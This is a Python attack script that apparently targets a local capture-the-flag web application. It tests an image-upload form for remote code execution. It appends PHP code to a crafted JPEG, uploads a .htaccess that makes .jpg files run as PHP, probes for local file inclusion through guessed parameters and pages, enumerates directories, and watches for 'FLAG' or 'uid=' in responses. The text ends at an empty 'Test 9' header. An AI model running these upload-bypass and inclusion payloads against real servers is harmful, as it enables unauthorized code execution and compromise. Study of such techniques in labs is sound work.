import requests
import re

base_url = "http://127.0.0.1:33021"

# Create minimal valid JPEG
def create_minimal_jpeg():
    jpeg = b'\xff\xd8'
    jpeg += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg += b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
    jpeg += b'\x08\x0a\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
    jpeg += b'\x1f\x1e\x1d\x1a\x1c\x1c $.\x28 #\x17\x1c,),.444444)\x22\x22\x22'
    jpeg += b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
    jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
    jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00'
    jpeg += b'\x7f\xd4\xb5\xa8\x88'
    jpeg += b'\xff\xd9'
    return jpeg

jpeg_content = create_minimal_jpeg()

# Test 1: Check if there's a parameter that displays the uploaded image
print("[*] TEST 1: Check image display mechanism")
r = requests.get(f"{base_url}/index.php")
# Look for any parameters in the HTML
forms = re.findall(r'<form[^>]*>', r.text, re.I)
links = re.findall(r'<a[^>]*href[^>]*>', r.text, re.I)
imgs = re.findall(r'<img[^>]*src[^>]*>', r.text, re.I)
print(f"[+] Forms: {forms}")
print(f"[+] Links: {links}")
print(f"[+] Images: {imgs}")

# Test 2: Check if the image source triggers PHP execution
print("\n[*] TEST 2: Check if uploaded images execute PHP")
# Upload a test image with unique marker
marker = b'MARKER_UNIQUE_12345'
test_jpeg = jpeg_content + b'<?php echo "' + marker + b'"; ?>'
files = {'userfile': ('test_exec.jpg', test_jpeg, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    print(f"[+] Uploaded: {filename}")
    r2 = requests.get(f"{base_url}/upload/{filename}")
    if marker.decode() in r2.text:
        print("[!] PHP executed - marker found!")
    else:
        print(f"[+] Content: {r2.text[:200]}")

# Test 3: Try to find the source of where images are displayed
print("\n[*] TEST 3: Analyze how images are displayed")
r = requests.get(f"{base_url}/index.php")
# Look for the img tag and its source
img_match = re.search(r'<img[^>]*src=["\']([^"\']+)["\']', r.text)
if img_match:
    img_src = img_match.group(1)
    print(f"[+] Image src: {img_src}")
    # Access the image source
    r2 = requests.get(f"{base_url}/{img_src}")
    print(f"[+] Response: {r2.status_code} ({len(r2.content)} bytes)")

# Test 4: Check if there's an "img" parameter that could be LFI
print("\n[*] TEST 4: Try LFI via img parameter")
r = requests.get(f"{base_url}/index.php", params={'img': 'upload/shell.jpg'})
print(f"[+] Response: {r.text[:500]}")

# Test 5: Try to upload a .htaccess that allows PHP execution
print("\n[*] TEST 5: Try to upload .htaccess")
htaccess = jpeg_content + b'\nAddType application/x-httpd-php .jpg\n'
files = {'userfile': ('.htaccess', htaccess, 'text/plain')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {r.text[:500]}")

# Check if .htaccess was uploaded
r2 = requests.get(f"{base_url}/upload/.htaccess")
if r2.status_code == 200:
    print("[!!!] .htaccess EXISTS!")
    print(f"[+] Content: {r2.text}")

# Test 6: Check what happens with valid JPEG only (no PHP appended)
print("\n[*] TEST 6: Upload pure JPEG")
files = {'userfile': ('pure.jpg', jpeg_content, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {r.text[:500]}")

# Test 7: Check if there's a path to execute PHP
print("\n[*] TEST 7: Try to find PHP execution path")
# Maybe there's a file that includes uploaded images
php_files = ['list.php', 'gallery.php', 'view.php', 'display.php', 'show.php', 'image.php']
for php_file in php_files:
    r = requests.get(f"{base_url}/{php_file}", params={'file': 'upload/shell.jpg'})
    if r.status_code == 200 and ('FLAG' in r.text or 'uid=' in r.text):
        print(f"[!!!] EXECUTION at {php_file}!")
        print(r.text)

# Test 8: Check the actual directory listing
print("\n[*] TEST 8: Directory enumeration")
dirs = ['/upload/', '/images/', '/files/', '/tmp/']
for d in dirs:
    r = requests.get(f"{base_url}{d}")
    print(f"[+] {d}: {r.status_code}")

# Test 9: Try to read the PHP source code
print("\n[*] TEST 9: Source code disclosure")
